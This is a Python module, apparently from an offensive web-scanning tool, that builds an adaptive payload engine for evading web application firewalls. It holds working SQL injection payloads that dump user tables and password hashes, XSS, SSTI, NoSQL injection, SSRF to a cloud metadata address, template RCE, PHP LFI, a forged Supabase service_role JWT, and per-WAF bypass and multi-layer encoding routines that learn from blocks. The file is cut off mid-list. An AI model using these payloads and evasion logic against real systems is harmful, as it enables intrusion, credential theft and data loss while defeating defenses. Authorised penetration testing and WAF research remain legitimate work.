"""Adaptive Payload Engine — learns from observed blocks and mutates payloads.

This module wraps PayloadForge and adds:
1. Payload learning — track what works vs gets blocked
2. WAF-specific bypass dictionaries — deep bypass rules per WAF
3. Target-specific payload selection — Supabase payloads for Supabase targets
4. Adaptive mutation — mutate based on WAF type and observed blocks
5. Feedback loop — learn from each scan, improve for next
"""

from __future__ import annotations

import json
import time
from collections import defaultdict
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

from titan.ai.payloadforge import PayloadForge  # noqa: E402
from titan.ai.waf_profiles import (
    ERROR_DIALECT_PATTERNS,
    WAF_FINGERPRINT_PAYLOADS,
    WAF_RULE_PATTERNS,
)


@dataclass
class PayloadResult:
    """Track the result of a payload attempt."""
    payload: str
    attack_type: str
    status: int
    blocked: bool
    waf_detected: Optional[str] = None
    error_class: Optional[str] = None
    timestamp: float = field(default_factory=time.time)


@dataclass
class WAFProfile:
    """WAF-specific bypass rules and learned patterns."""
    name: str
    bypass_techniques: List[str] = field(default_factory=list)
    blocked_patterns: List[str] = field(default_factory=list)
    successful_bypasses: List[str] = field(default_factory=list)
    scan_count: int = 0
    block_rate: float = 0.0


@dataclass
class TargetProfile:
    """Target-specific payload preferences learned during scan."""
    url: str
    tech_stack: List[str] = field(default_factory=list)
    waf: Optional[str] = None
    baas_type: Optional[str] = None  # supabase, firebase, appwrite
    auth_type: Optional[str] = None  # jwt, session, oauth, clerk
    framework: Optional[str] = None  # react, vue, next, django, flask
    language: Optional[str] = None   # python, javascript, php, java
    blocked_patterns: List[str] = field(default_factory=list)
    successful_patterns: List[str] = field(default_factory=list)
    error_patterns: List[str] = field(default_factory=list)


class ResponseAnalyzer:
    """Analyze responses to understand WHY payloads were blocked or succeeded."""

    # WAF rule patterns, fingerprint payloads, and dialect patterns live in
    # titan/ai/waf_profiles.py (extracted so they can be tested directly).
    # Re-exposed as class attributes to keep every ``cls.X`` call site intact.
    WAF_RULE_PATTERNS = WAF_RULE_PATTERNS
    WAF_FINGERPRINT_PAYLOADS = WAF_FINGERPRINT_PAYLOADS
    ERROR_DIALECT_PATTERNS = ERROR_DIALECT_PATTERNS

    @classmethod
    def analyze_blocked(cls, payload: str, status: int, body: str, headers: Dict[str, str]) -> Dict[str, Any]:
        """Analyze WHY a payload was blocked."""
        analysis: Dict[str, Any] = {
            "blocked": True,
            "status": status,
            "waf_rule": None,
            "blocked_pattern": None,
            "blocked_position": None,
            "suggested_bypass": None,
        }

        body_lower = body.lower() if body else ""
        payload_lower = payload.lower()

        # Detect which WAF rule triggered
        for rule_name, keywords in cls.WAF_RULE_PATTERNS.items():
            for keyword in keywords:
                if keyword in payload_lower and keyword in body_lower:
                    analysis["waf_rule"] = rule_name
                    analysis["blocked_pattern"] = keyword
                    break

        # Detect where in the payload was blocked
        if analysis["blocked_pattern"]:
            pattern = analysis["blocked_pattern"]
            idx = payload_lower.find(pattern)
            if idx >= 0:
                analysis["blocked_position"] = {
                    "start": idx,
                    "end": idx + len(pattern),
                    "context": payload[max(0, idx-10):idx+len(pattern)+10],
                }

        # Suggest bypass based on blocked pattern
        analysis["suggested_bypass"] = cls._suggest_bypass(analysis)

        return analysis

    @classmethod
    def _suggest_bypass(cls, analysis: Dict[str, Any]) -> Optional[str]:
        """Suggest a bypass based on analysis."""
        rule = analysis.get("waf_rule")
        pattern = analysis.get("blocked_pattern")

        if rule == "sql_injection":
            if pattern in ("union", "select"):
                return "Try UNION/**/SELECT or /*!UNION*/ SELECT"
            elif pattern in ("or", "and"):
                return "Try OR/**/1=1 or &&1=1"
            elif pattern in ("--", "#"):
                return "Try /**/ or %0a"

        elif rule == "xss_injection":
            if pattern == "script":
                return "Try <img onerror or <svg onload"
            elif pattern == "alert":
                return "Try prompt() or confirm()"
            elif pattern == "javascript:":
                return "Try data:text/html or javascript%3a"

        elif rule == "path_traversal":
            if pattern == "..":
                return "Try ....// or ..%2f or %2e%2e%2f"

        elif rule == "command_injection":
            if pattern in (";", "|", "&&"):
                return "Try %0a or %0d or newline injection"

        elif rule == "ssrf":
            if "169.254" in str(pattern):
                return "Try decimal IP 2130706433 or hex 0x7f000001"

        return None

    @classmethod
    def analyze_success(cls, payload: str, status: int, body: str, headers: Dict[str, str]) -> Dict[str, Any]:
        """Analyze WHY a payload succeeded."""
        analysis: Dict[str, Any] = {
            "blocked": False,
            "status": status,
            "dialect": None,
            "version": None,
            "data_leaked": False,
            "sensitive_data": [],
        }

        body_lower = body.lower() if body else ""

        # Detect database dialect from response
        for dialect, patterns in cls.ERROR_DIALECT_PATTERNS.items():
            for pattern in patterns:
                if pattern in body_lower:
                    analysis["dialect"] = dialect
                    break
            if analysis["dialect"]:
                break

        # Detect sensitive data
        sensitive_patterns = {
            "password": ["password", "passwd", "pwd", "pass"],
            "email": ["email", "e-mail", "mail"],
            "token": ["token", "api_key", "apikey", "secret"],
            "credit_card": ["credit", "card", "visa", "mastercard", "amex"],
            "ssn": ["ssn", "social security"],
        }

        for data_type, keywords in sensitive_patterns.items():
            for keyword in keywords:
                if keyword in body_lower:
                    analysis["sensitive_data"].append(data_type)
                    analysis["data_leaked"] = True
                    break

        return analysis

    @classmethod
    def fingerprint_waf(cls, response_func, target_url: str) -> Dict[str, Any]:
        """Fingerprint the WAF by sending test payloads."""
        # This would be called with a response function
        # For now, return a basic fingerprint structure
        return {
            "detected": False,
            "name": None,
            "version": None,
            "type": None,  # free, enterprise, custom
            "rules": [],
            "bypass_strategy": None,
        }


class PayloadChainGenerator:
    """Generate multi-layer encoded payload chains."""

    @staticmethod
    def generate_chains(payload: str, max_chains: int = 10) -> List[str]:
        """Generate chained encoding payloads."""
        chains = []

        # Chain 1: URL → Base64
        from urllib.parse import quote
        import base64
        url_encoded = quote(payload, safe="")
        b64_of_url = base64.b64encode(url_encoded.encode()).decode()
        chains.append(b64_of_url)

        # Chain 2: Double URL encoding
        chains.append(quote(quote(payload, safe="")))

        # Chain 3: URL → Hex
        hex_of_url = url_encoded.encode().hex()
        chains.append(hex_of_url)

        # Chain 4: Mixed encoding per character
        mixed = ""
        for i, c in enumerate(payload):
            if i % 4 == 0:
                mixed += quote(c, safe="")
            elif i % 4 == 1:
                mixed += f"%{ord(c):02x}"
            elif i % 4 == 2:
                mixed += c.upper() if c.islower() else c.lower()
            else:
                mixed += c
        chains.append(mixed)

        # Chain 5: Unicode + URL
        unicode_payload = ""
        for c in payload:
            if ord(c) > 127:
                unicode_payload += f"%u{ord(c):04x}"
            else:
                unicode_payload += quote(c, safe="")
        chains.append(unicode_payload)

        # Chain 6: HTML entities + URL
        html_url = ""
        for c in payload:
            if ord(c) > 127:
                html_url += f"&#x{ord(c):x};"
            else:
                html_url += quote(c, safe="")
        chains.append(html_url)

        # Chain 7: Comment insertion + encoding
        comment_payload = payload.replace(" ", "/**/")
        chains.append(quote(comment_payload, safe=""))

        # Chain 8: Whitespace variation + encoding
        whitespace_payload = payload.replace(" ", "%09%0a%0d")
        chains.append(quote(whitespace_payload, safe=""))

        # Chain 9: Case toggle + encoding
        case_toggled = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
        chains.append(quote(case_toggled, safe=""))

        # Chain 10: Triple encoding
        chains.append(quote(quote(quote(payload, safe=""), safe="")))

        # Deduplicate and limit
        seen = set()
        result = []
        for c in chains:
            if c not in seen and c != payload:
                seen.add(c)
                result.append(c)
            if len(result) >= max_chains:
                break

        return result


@dataclass
class InjectionContext:
    """Context of where the injection is happening."""
    location: str  # query, body, header, cookie, path
    injection_point: str  # html_attribute, js_string, sql_query, template, json_value
    content_type: str  # text/html, application/json, text/plain
    encoding: str  # utf-8, latin-1, etc.
    previous_chars: str = ""  # chars before injection point
    next_chars: str = ""  # chars after injection point


class ContextAwarePayloadSelector:
    """Select payloads based on WHERE the injection is."""

    @staticmethod
    def get_context_payloads(attack_type: str, context: InjectionContext) -> List[str]:
        """Get payloads optimized for the injection context."""
        payloads = []

        if context.injection_point == "html_attribute":
            payloads.extend(ContextAwarePayloadSelector._html_attribute_payloads(attack_type))
        elif context.injection_point == "js_string":
            payloads.extend(ContextAwarePayloadSelector._js_string_payloads(attack_type))
        elif context.injection_point == "sql_query":
            payloads.extend(ContextAwarePayloadSelector._sql_query_payloads(attack_type))
        elif context.injection_point == "template":
            payloads.extend(ContextAwarePayloadSelector._template_payloads(attack_type))
        elif context.injection_point == "json_value":
            payloads.extend(ContextAwarePayloadSelector._json_value_payloads(attack_type))

        return payloads

    @staticmethod
    def _html_attribute_payloads(attack_type: str) -> List[str]:
        if attack_type == "xss":
            return [
                '" onfocus=alert(1) autofocus="',
                "' onfocus=alert(1) autofocus='",
                '" onmouseover=alert(1) id="',
                '" onerror=alert(1) id="',
                '" onclick=alert(1) id="',
                '"><script>alert(1)</script>',
                '"><img src=x onerror=alert(1)>',
            ]
        return []

    @staticmethod
    def _js_string_payloads(attack_type: str) -> List[str]:
        if attack_type == "xss":
            return [
                "';alert(1);//",
                '";alert(1);//',
                "'-alert(1)-'",
                '"-alert(1)-"',
                "\\';alert(1);//",
                "\";alert(1);//",
                "`-alert(1)-`",
                "${alert(1)}",
            ]
        return []

    @staticmethod
    def _sql_query_payloads(attack_type: str) -> List[str]:
        if attack_type == "sqli":
            return [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "' AND SLEEP(3)--",
                "' AND BENCHMARK(5000000,MD5('a'))--",
            ]
        return []

    @staticmethod
    def _template_payloads(attack_type: str) -> List[str]:
        if attack_type == "ssti":
            return [
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "<%= 7*7 %>",
                "{{config}}",
                "{{self.__init__.__globals__}}",
            ]
        return []

    @staticmethod
    def _json_value_payloads(attack_type: str) -> List[str]:
        if attack_type == "nosqli":
            return [
                '{"$ne": null}',
                '{"$gt": ""}',
                '{"$exists": true}',
                '{"$regex": ".*"}',
                '{"$where": "1==1"}',
            ]
        elif attack_type == "sqli":
            return [
                "' OR '1'='1",
                "1; DROP TABLE users",
                "' UNION SELECT NULL--",
            ]
        return []

    @staticmethod
    def detect_injection_point(response_body: str, param_name: str, param_value: str) -> InjectionContext:
        """Detect where the injection point is in the response."""
        context = InjectionContext(
            location="unknown",
            injection_point="unknown",
            content_type="text/html",
            encoding="utf-8",
        )

        body_lower = response_body.lower() if response_body else ""
        param_lower = param_value.lower() if param_value else ""

        # Check if value appears in HTML attribute
        if f'"{param_lower}"' in body_lower or f"'{param_lower}'" in body_lower:
            context.injection_point = "html_attribute"
            context.location = "body"

        # Check if value appears in JS string
        elif f'"{param_lower}"' in body_lower or f"'{param_lower}'" in body_lower:
            context.injection_point = "js_string"
            context.location = "body"

        # Check if value appears in SQL error
        elif any(kw in body_lower for kw in ["sql", "syntax", "mysql", "postgresql"]):
            context.injection_point = "sql_query"
            context.location = "body"

        # Check if value appears in template
        elif any(kw in body_lower for kw in ["template", "render", "jinja", "twig"]):
            context.injection_point = "template"
            context.location = "body"

        # Default to query parameter
        else:
            context.injection_point = "query"
            context.location = "query"

        return context


class PayloadPrioritizer:
    """Rank payloads by likelihood of success."""

    @staticmethod
    def prioritize(
        payloads: List[str],
        target_profile: Optional[TargetProfile] = None,
        waf_profile: Optional[WAFProfile] = None,
        error_dialect: Optional[str] = None,
    ) -> List[str]:
        """Rank payloads by likelihood of success."""
        scored = []

        for payload in payloads:
            score = PayloadPrioritizer._score_payload(
                payload, target_profile, waf_profile, error_dialect
            )
            scored.append((score, payload))

        # Sort by score (highest first)
        scored.sort(key=lambda x: x[0], reverse=True)

        return [p for _, p in scored]

    @staticmethod
    def _score_payload(
        payload: str,
        target_profile: Optional[TargetProfile],
        waf_profile: Optional[WAFProfile],
        error_dialect: Optional[str],
    ) -> float:
        score = 0.5  # Base score

        # Boost if payload matches target's dialect
        if error_dialect:
            if error_dialect == "mysql" and "mysql" in payload.lower():
                score += 0.2
            elif error_dialect == "postgresql" and "pg_" in payload.lower():
                score += 0.2
            elif error_dialect == "mssql" and "waitfor" in payload.lower():
                score += 0.2

        # Boost if payload is short (less likely to be blocked)
        if len(payload) < 20:
            score += 0.1

        # Boost if payload uses encoding (more likely to bypass WAF)
        if any(enc in payload for enc in ["%", "&#", "/**/"]):
            score += 0.1

        # Reduce if payload was blocked before
        if waf_profile and payload in waf_profile.blocked_patterns:
            score -= 0.3

        # Boost if payload was successful before
        if waf_profile and payload in waf_profile.successful_bypasses:
            score += 0.3

        return max(0.0, min(1.0, score))


class AdaptivePayloadEngine:
    """Learns from observed blocks and generates context-aware payloads."""

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        self.config = config or {}
        self.forge = PayloadForge()
        self.profiles: Dict[str, TargetProfile] = {}
        self.waf_profiles: Dict[str, WAFProfile] = {}
        self.payload_history: List[PayloadResult] = []
        self._learned_bypasses: Dict[str, List[str]] = defaultdict(list)
        self._state_file = Path("findings") / "payload_learning.json"
        self._error_dialect: Optional[str] = None
        self._load_state()

    def _load_state(self) -> None:
        """Load learned patterns from previous scans."""
        if self._state_file.exists():
            try:
                data = json.loads(self._state_file.read_text(encoding="utf-8"))
                for waf_name, waf_data in data.get("waf_profiles", {}).items():
                    profile = WAFProfile(name=waf_name, **waf_data)
                    self.waf_profiles[waf_name] = profile
                for pattern in data.get("learned_bypasses", {}).get("global", []):
                    self._learned_bypasses["global"].append(pattern)
            except Exception:
                pass

    def _save_state(self) -> None:
        """Save learned patterns for future scans."""
        try:
            self._state_file.parent.mkdir(parents=True, exist_ok=True)
            data = {
                "waf_profiles": {
                    name: {
                        "bypass_techniques": p.bypass_techniques,
                        "blocked_patterns": p.blocked_patterns[-100:],
                        "successful_bypasses": p.successful_bypasses[-100:],
                        "scan_count": p.scan_count,
                        "block_rate": p.block_rate,
                    }
                    for name, p in self.waf_profiles.items()
                },
                "learned_bypasses": {
                    "global": self._learned_bypasses.get("global", [])[-200:]
                },
            }
            self._state_file.write_text(json.dumps(data, indent=2), encoding="utf-8")
        except Exception:
            pass

    # ── Target Profile ──────────────────────────────────────────────────

    def create_target_profile(self, url: str, fingerprint: Dict[str, Any]) -> TargetProfile:
        """Create a target profile from fingerprint data."""
        profile = TargetProfile(url=url)

        # Extract tech stack
        techs = [t.lower() for t in fingerprint.get("technologies", [])]
        profile.tech_stack = techs

        # Detect WAF
        profile.waf = fingerprint.get("waf")

        # Detect BaaS
        body = fingerprint.get("body", "")
        body_lower = body.lower() if body else ""
        if "supabase" in body_lower or "supabase" in " ".join(techs):
            profile.baas_type = "supabase"
        elif "firebase" in body_lower or "firebase" in " ".join(techs):
            profile.baas_type = "firebase"
        elif "appwrite" in body_lower or "appwrite" in " ".join(techs):
            profile.baas_type = "appwrite"

        # Detect auth type
        if "clerk" in body_lower or "clerk" in " ".join(techs):
            profile.auth_type = "clerk"
        elif "auth0" in body_lower or "auth0" in " ".join(techs):
            profile.auth_type = "auth0"
        elif "jwt" in body_lower:
            profile.auth_type = "jwt"
        elif "session" in body_lower:
            profile.auth_type = "session"

        # Detect framework
        if "next" in " ".join(techs) or "nextjs" in " ".join(techs):
            profile.framework = "next"
        elif "react" in " ".join(techs):
            profile.framework = "react"
        elif "vue" in " ".join(techs):
            profile.framework = "vue"
        elif "angular" in " ".join(techs):
            profile.framework = "angular"
        elif "django" in " ".join(techs):
            profile.framework = "django"
        elif "flask" in " ".join(techs):
            profile.framework = "flask"
        elif "laravel" in " ".join(techs):
            profile.framework = "laravel"
        elif "express" in " ".join(techs):
            profile.framework = "express"

        # Detect language
        if "php" in " ".join(techs) or "laravel" in " ".join(techs):
            profile.language = "php"
        elif "python" in " ".join(techs) or "django" in " ".join(techs) or "flask" in " ".join(techs):
            profile.language = "python"
        elif "node" in " ".join(techs) or "express" in " ".join(techs):
            profile.language = "javascript"
        elif "java" in " ".join(techs):
            profile.language = "java"
        elif "dotnet" in " ".join(techs) or "asp" in " ".join(techs):
            profile.language = "csharp"

        self.profiles[url] = profile
        return profile

    def get_target_profile(self, url: str) -> Optional[TargetProfile]:
        """Get the target profile for a URL."""
        return self.profiles.get(url)

    # ── Payload Generation ──────────────────────────────────────────────

    def get_adaptive_payloads(
        self,
        attack_type: str,
        target_url: str,
        context: Optional[Dict[str, Any]] = None,
        injection_context: Optional[InjectionContext] = None,
        max_payloads: int = 30,
    ) -> List[str]:
        """Generate adaptive payloads based on target profile and learned patterns."""
        context = context or {}
        profile = self.profiles.get(target_url)
        waf_profile = self.waf_profiles.get(profile.waf) if profile and profile.waf else None

        # Start with base payloads
        base_payloads = self.forge.get_context_payloads(attack_type, context)

        # Add context-aware payloads
        if injection_context:
            context_payloads = ContextAwarePayloadSelector.get_context_payloads(
                attack_type, injection_context
            )
            base_payloads.extend(context_payloads)

        # Add target-specific payloads
        if profile:
            target_payloads = self._get_target_specific_payloads(attack_type, profile)
            base_payloads.extend(target_payloads)

        # Add WAF-specific bypasses
        if profile and profile.waf:
            waf_payloads = self._get_waf_specific_bypasses(attack_type, profile.waf)
            base_payloads.extend(waf_payloads)

        # Add learned bypasses
        learned = self._get_learned_bypasses(attack_type, profile.waf if profile else None)
        base_payloads.extend(learned)

        # Add global learned bypasses
        global_learned = self._learned_bypasses.get("global", [])
        base_payloads.extend(global_learned[:10])

        # Add chained payloads for high-value targets
        if profile and profile.waf:
            for payload in base_payloads[:5]:
                chains = PayloadChainGenerator.generate_chains(payload, max_chains=3)
                base_payloads.extend(chains)

        # Prioritize payloads
        prioritized = PayloadPrioritizer.prioritize(
            base_payloads, profile, waf_profile, self._error_dialect
        )

        # Deduplicate and limit
        seen = set()
        result = []
        for p in prioritized:
            if p not in seen:
                seen.add(p)
                result.append(p)
            if len(result) >= max_payloads:
                break

        return result

    def _get_target_specific_payloads(self, attack_type: str, profile: TargetProfile) -> List[str]:
        """Generate payloads specific to the target's stack."""
        payloads = []

        # BaaS-specific payloads
        if profile.baas_type == "supabase":
            payloads.extend(self._supabase_payloads(attack_type))
        elif profile.baas_type == "firebase":
            payloads.extend(self._firebase_payloads(attack_type))
        elif profile.baas_type == "appwrite":
            payloads.extend(self._appwrite_payloads(attack_type))

        # Framework-specific payloads
        if profile.framework == "next":
            payloads.extend(self._nextjs_payloads(attack_type))
        elif profile.framework == "django":
            payloads.extend(self._django_payloads(attack_type))
        elif profile.framework == "laravel":
            payloads.extend(self._laravel_payloads(attack_type))

        # Language-specific payloads
        if profile.language == "php":
            payloads.extend(self._php_payloads(attack_type))
        elif profile.language == "python":
            payloads.extend(self._python_payloads(attack_type))
        elif profile.language == "javascript":
            payloads.extend(self._javascript_payloads(attack_type))

        # Auth-specific payloads
        if profile.auth_type == "clerk":
            payloads.extend(self._clerk_payloads(attack_type))
        elif profile.auth_type == "auth0":
            payloads.extend(self._auth0_payloads(attack_type))

        return payloads

    def _get_waf_specific_bypasses(self, attack_type: str, waf: str) -> List[str]:
        """Generate WAF-specific bypass payloads."""
        bypasses = []

        waf_bypass_rules = {
            "cloudflare": {
                "sqli": [
                    "' /*!50000UNION*/ SELECT NULL--",
                    "' /*!50000SELECT*/ NULL--",
                    "'/**/UNION/**/SELECT/**/NULL--",
                    "'%20UNION%20SELECT%20NULL--",
                    "'UN/**/ION SEL/**/ECT NULL--",
                    "' UNION%0aSELECT NULL--",
                    "' UNION%0dSELECT NULL--",
                ],
                "xss": [
                    "<svg/onload=alert(1)>",
                    "<img src=x onerror=alert(1)>",
                    "<script>alert(1)</script>",
                    "javascript:alert(1)",
                    "<svg onload=alert(1)>",
                    "<<script>alert(1)//</script>",
                    "<img src=x onerror=alert`1`>",
                ],
                "ssrf": [
                    "http://169.254.169.254/latest/meta-data/",
                    "http://127.0.0.1:80",
                    "http://localhost:80",
                ],
            },
            "akamai": {
                "sqli": [
                    "' UNION SELECT NULL--",
                    "' UNION ALL SELECT NULL--",
                    "' UNION/**/SELECT NULL--",
                    "1' ORDER BY 1--",
                    "' AND 1=1--",
                ],
                "xss": [
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                    "javascript:alert(1)",
                ],
            },
            "aws_waf": {
                "sqli": [
                    "' UNION SELECT NULL--",
                    "' OR '1'='1",
                    "1' AND 1=1--",
                    "' AND SLEEP(3)--",
                ],
                "xss": [
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                ],
            },
            "imperva": {
                "sqli": [
                    "' UNION SELECT NULL--",
                    "' OR '1'='1",
                    "1' AND 1=1--",
                ],
                "xss": [
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                ],
            },
            "mod_security": {
                "sqli": [
                    "' UNION SELECT NULL--",
                    "' OR '1'='1",
                    "1' AND 1=1--",
                    "' AND SLEEP(3)--",
                ],
                "xss": [
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                ],
            },
        }

        if waf in waf_bypass_rules:
            bypasses.extend(waf_bypass_rules[waf].get(attack_type, []))

        return bypasses

    def _get_learned_bypasses(self, attack_type: str, waf: Optional[str]) -> List[str]:
        """Get bypasses learned from previous scans."""
        bypasses = []

        # WAF-specific learned bypasses
        if waf and waf in self.waf_profiles:
            profile = self.waf_profiles[waf]
            bypasses.extend(profile.successful_bypasses)

        # Attack-type specific learned bypasses
        key = f"{attack_type}:{waf or 'none'}"
        bypasses.extend(self._learned_bypasses.get(key, []))

        return bypasses

    # ── Payload Recording ───────────────────────────────────────────────

    def record_payload_result(
        self,
        payload: str,
        attack_type: str,
        status: int,
        target_url: str,
        response_body: str = "",
        response_headers: Optional[Dict[str, str]] = None,
    ) -> Dict[str, Any]:
        """Record the result of a payload attempt for learning."""
        profile = self.profiles.get(target_url)
        waf = profile.waf if profile else None

        # Analyze response using ResponseAnalyzer
        if self._is_blocked(status, response_body, response_headers):
            analysis = ResponseAnalyzer.analyze_blocked(
                payload, status, response_body, response_headers or {}
            )
            blocked = True
            error_class = None
            # Update error dialect from analysis
            if analysis.get("waf_rule"):
                pass  # WAF rule detected
        else:
            analysis = ResponseAnalyzer.analyze_success(
                payload, status, response_body, response_headers or {}
            )
            blocked = False
            error_class = analysis.get("dialect")
            # Update error dialect
            if error_class:
                self._error_dialect = error_class

        result = PayloadResult(
            payload=payload,
            attack_type=attack_type,
            status=status,
            blocked=blocked,
            waf_detected=waf,
            error_class=error_class,
        )
        self.payload_history.append(result)

        # Update WAF profile
        if waf:
            self._update_waf_profile(waf, payload, blocked, attack_type)

        # Update target profile
        if profile:
            if blocked:
                profile.blocked_patterns.append(payload)
            else:
                profile.successful_patterns.append(payload)

        # Learn from successful bypasses
        if not blocked and status == 200:
            self._learn_successful_bypass(payload, attack_type, waf)

        return analysis

    def _is_blocked(
        self,
        status: int,
        body: str,
        headers: Optional[Dict[str, str]] = None,
    ) -> bool:
        """Determine if a payload was blocked by WAF."""
        # Common block indicators
        block_statuses = {403, 406, 429, 503}
        if status in block_statuses:
            return True

        body_lower = body.lower() if body else ""
        block_indicators = [
            "access denied",
            "blocked",
            "forbidden",
            "not acceptable",
            "security violation",
            "rate limited",
            "too many requests",
            "cloudflare",
            "akamai",
            "incapsula",
            "mod_security",
        ]

        for indicator in block_indicators:
            if indicator in body_lower:
                return True

        return False

    def _extract_error_class(self, body: str) -> Optional[str]:
        """Extract error class from response body."""
        body_lower = body.lower() if body else ""

        error_classes = {
            "sql": ["sql", "mysql", "postgresql", "sqlite", "oracle", "mssql", "syntax error"],
            "nosql": ["mongo", "nosql", "unexpected token"],
            "template": ["template", "jinja", "twig", "freemarker", "render"],
            "python": ["traceback", "error:", "exception"],
            "java": ["exception", "stacktrace", "java."],
            "php": ["php", "warning:", "fatal error"],
            "xml": ["xml", "parser", " sax"],
            "filesystem": ["file not found", "no such file", "permission denied"],
        }

        for error_class, keywords in error_classes.items():
            for keyword in keywords:
                if keyword in body_lower:
                    return error_class

        return None

    def _update_waf_profile(
        self,
        waf: str,
        payload: str,
        blocked: bool,
        attack_type: str,
    ) -> None:
        """Update WAF profile with new observation."""
        if waf not in self.waf_profiles:
            self.waf_profiles[waf] = WAFProfile(name=waf)

        profile = self.waf_profiles[waf]
        profile.scan_count += 1

        if blocked:
            profile.blocked_patterns.append(payload)
            # Keep only last 100 patterns
            if len(profile.blocked_patterns) > 100:
                profile.blocked_patterns = profile.blocked_patterns[-100:]
        else:
            profile.successful_bypasses.append(payload)
            if len(profile.successful_bypasses) > 100:
                profile.successful_bypasses = profile.successful_bypasses[-100:]

        # Update block rate
        total = profile.scan_count
        blocked_count = len(profile.blocked_patterns)
        profile.block_rate = blocked_count / total if total > 0 else 0.0

    def _learn_successful_bypass(
        self,
        payload: str,
        attack_type: str,
        waf: Optional[str],
    ) -> None:
        """Learn from successful bypasses for future scans."""
        key = f"{attack_type}:{waf or 'none'}"
        if payload not in self._learned_bypasses[key]:
            self._learned_bypasses[key].append(payload)
            # Keep only last 50 per key
            if len(self._learned_bypasses[key]) > 50:
                self._learned_bypasses[key] = self._learned_bypasses[key][-50:]

        # Also add to global learned bypasses
        if payload not in self._learned_bypasses["global"]:
            self._learned_bypasses["global"].append(payload)

    # ── Target-Specific Payloads ────────────────────────────────────────

    def _supabase_payloads(self, attack_type: str) -> List[str]:
        """Supabase-specific attack payloads."""
        payloads = []

        if attack_type == "sqli":
            payloads.extend([
                # Supabase uses PostgreSQL
                "' UNION SELECT NULL FROM auth.users--",
                "' UNION SELECT id,email,encrypted_password FROM auth.users--",
                "' UNION SELECT NULL FROM storage.buckets--",
                "' UNION SELECT NULL FROM storage.objects--",
                "1' UNION SELECT NULL,NULL,NULL FROM information_schema.tables--",
                "' UNION SELECT schemaname,tablename FROM pg_tables--",
            ])

        elif attack_type == "idor":
            payloads.extend([
                # Supabase REST API IDOR
                "/rest/v1/users?select=*",
                "/rest/v1/profiles?select=*",
                "/rest/v1/orders?select=*",
                "/rest/v1/?select=*,users(*)",
                # Try different ID formats
                "?id=eq.1",
                "?id=eq.2",
                "?id=eq.999999",
                "?user_id=eq.1",
                "?user_id=neq.1",
            ])

        elif attack_type == "auth":
            payloads.extend([
                # Supabase auth bypass attempts
                "/auth/v1/signup",
                "/auth/v1/token?grant_type=password",
                "/auth/v1/admin/users",
                "/auth/v1/admin/users?page=1",
                # Phone auto-confirm
                "/auth/v1/signup",
                # JWT manipulation
                "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFkbWluIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTY5MzQwMTYwMH0.fake",
            ])

        elif attack_type == "baas":
            payloads.extend([
                # Supabase-specific
                "/rest/v1/rpc/get_public_profiles",
                "/rest/v1/rpc/get_org_role",
                "/rest/v1/rpc/admin_only_function",
                "/functions/v1/",
                "/functions/v1/gemini-chat",
                "/functions/v1/travel-intelligence",
                "/storage/v1/bucket/",
                "/storage/v1/object/auth/sign-up",
            ])

        return payloads

    def _firebase_payloads(self, attack_type: str) -> List[str]:
        """Firebase-specific attack payloads."""
        payloads = []

        if attack_type == "sqli":
            payloads.extend([
                # Firebase doesn't use SQL, but test for injection
                "' OR '1'='1",
                "1; DROP TABLE users",
            ])

        elif attack_type == "idor":
            payloads.extend([
                # Firestore IDOR
                "/.json",
                "/users.json",
                "/admin.json",
                "/config.json",
                "?shallow=true",
                "?print=pretty",
            ])

        elif attack_type == "auth":
            payloads.extend([
                # Firebase auth bypass
                "/identitytoolkit/v3/relyingparty/signupNewUser",
                "/identitytoolkit/v3/relyingparty/emailLinkSignin",
                "/identitytoolkit/v3/relyingparty/getAccountInfo",
                "/securetoken/v1/internals/token",
            ])

        elif attack_type == "baas":
            payloads.extend([
                # Firebase-specific
                "/.json?shallow=true",
                "/.json?print=pretty",
                "/users/.json",
                "/admin/.json",
                "/config/.json",
            ])

        return payloads

    def _appwrite_payloads(self, attack_type: str) -> List[str]:
        """AppWrite-specific attack payloads."""
        payloads = []

        if attack_type == "baas":
            payloads.extend([
                "/v1/account",
                "/v1/account/sessions",
                "/v1/database",
                "/v1/database/collections",
                "/v1/storage",
                "/v1/storage/buckets",
                "/v1/functions",
            ])

        return payloads

    def _nextjs_payloads(self, attack_type: str) -> List[str]:
        """Next.js-specific attack payloads."""
        payloads = []

        if attack_type == "ssrf":
            payloads.extend([
                "/_next/data/",
                "/api/",
                "/api/auth/",
                "/api/admin/",
            ])

        elif attack_type == "idor":
            payloads.extend([
                "/dashboard",
                "/dashboard/settings",
                "/dashboard/admin",
                "/admin",
                "/admin/users",
            ])

        return payloads

    def _django_payloads(self, attack_type: str) -> List[str]:
        """Django-specific attack payloads."""
        payloads = []

        if attack_type == "sqli":
            payloads.extend([
                "' UNION SELECT NULL FROM django_content_type--",
                "' UNION SELECT NULL FROM auth_user--",
                "' UNION SELECT username,password FROM auth_user--",
            ])

        elif attack_type == "idor":
            payloads.extend([
                "/admin/",
                "/admin/auth/user/",
                "/admin/auth/group/",
                "/admin/django_content_type/",
            ])

        return payloads

    def _laravel_payloads(self, attack_type: str) -> List[str]:
        """Laravel-specific attack payloads."""
        payloads = []

        if attack_type == "sqli":
            payloads.extend([
                "' UNION SELECT NULL FROM users--",
                "' UNION SELECT name,email,password FROM users--",
            ])

        elif attack_type == "idor":
            payloads.extend([
                "/api/user",
                "/api/user/1",
                "/api/user/2",
                "/api/admin",
                "/api/admin/users",
            ])

        elif attack_type == "rce":
            payloads.extend([
                "{{ system('id') }}",
                "{{ exec('id') }}",
                "{{ passthru('id') }}",
            ])

        return payloads

    def _php_payloads(self, attack_type: str) -> List[str]:
        """PHP-specific attack payloads."""
        payloads = []

        if attack_type == "lfi":
            payloads.extend([
                "php://filter/read=convert.base64-encode/resource=index.php",
                "php://filter/resource=config.php",
                "php://input",
